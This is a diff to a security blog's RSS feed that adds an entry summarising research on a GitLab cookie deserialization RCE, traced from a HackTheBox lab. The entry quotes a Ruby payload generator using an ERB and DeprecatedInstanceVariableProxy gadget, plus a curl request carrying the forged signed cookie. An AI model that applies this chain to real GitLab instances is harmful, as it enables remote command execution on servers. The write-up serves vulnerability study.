@@ -6,7 +6,21 @@
     <description>Recent content in Posts on F0rmat的博客 | 专注于网络攻防和信息安全</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sat, 06 Mar 2021 13:20:00 +0000</lastBuildDate><atom:link href="https://getshe11.com/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 01 Apr 2021 13:20:00 +0000</lastBuildDate><atom:link href="https://getshe11.com/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Gitlab Cookie 反序列化漏洞研究</title>
+      <link>https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/</link>
+      <pubDate>Thu, 01 Apr 2021 13:20:00 +0000</pubDate>
+      
+      <guid>https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/</guid>
+      <description>0x00 前言 前天上hackthebox玩了一台靶机Laboratory，发现是利用gitlab任意文件读取漏洞进行getshell的，我看了挺多相关的walkthrough，都没有说最后getshell的原理，都是直接上msf就完事了。怎么一个任意文件读取漏洞都能直接getshell，看着一知半解不是很舒服，遂研究。 0x01 寻找源头 1、Hackone 起初是William Bowling (vakzz)在Hackone提交了这个漏洞下面是漏洞详细的链接：https://hackerone.com/reports/827052这个页面一开始是讲到了这个任意文件读取的缺陷，UploadsRewriter 函数没有验证文件名导致的任意文件读取，gitlab评估了这个漏洞值1000美元。事情发生了转变，作者在后面补上了这个https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4说 cookies_serializer 设置了默认值 :hybrid 可能会导致远程命令执行漏洞
+ 利用上面的任意文件读取漏洞读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml里面的secret_key_base值 利用secret_key_base值生成payload 将payload封装在cookie的 experimentation_subject_id  发送完成攻击  作者给了一段生成payload的代码：
+request = ActionDispatch::Request.new(Rails.application.env_config) request.env[&amp;#34;action_dispatch.cookies_serializer&amp;#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(&amp;#34;&amp;lt;%= `echo vakzz was here &amp;gt; /tmp/vakzz` %&amp;gt;&amp;#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;#34;@result&amp;#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] 一开始我看到这个有点懵，但是我不熟悉Ruby啊。那就照葫芦画瓢在kali输入irb输入上面的代码，一顿操作猛如虎，一看错误二百五~有点头疼，那且先放一边，再往下看。作者执行后，发送get数据包，成功执行了命令：
+curl -vvv &amp;#39;http://gitlab-vm.local/users/sign_in&amp;#39; -b &amp;#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06&amp;#34; 后面gitlab重新定级给了作者20000美金！后来我再细读我才知道，作者这个是在装有gitlab的rails console 上面执行的，下面是执行的结果：2、作者的PDF 还是看不懂，怎么就getshell了啊，继续搜索。看到作者写的一个关于这个漏洞的PDF文件：https://devcraft.io/assets/hacktivitycon-slides.pdf里面在RCE那一块给了一个链接：https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/读英文还是有点吃力哈，文章说的是如何使用secret_token来入侵rails的应用一个session cookie例子：
+_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689 原文：
+ The cookie value (the part after the =) is split into 2 parts, separated by --.</description>
+    </item>
+    
     <item>
       <title>Kali Linux安装Clash</title>
       <link>https://getshe11.com/post/kali-install-clash/</link>
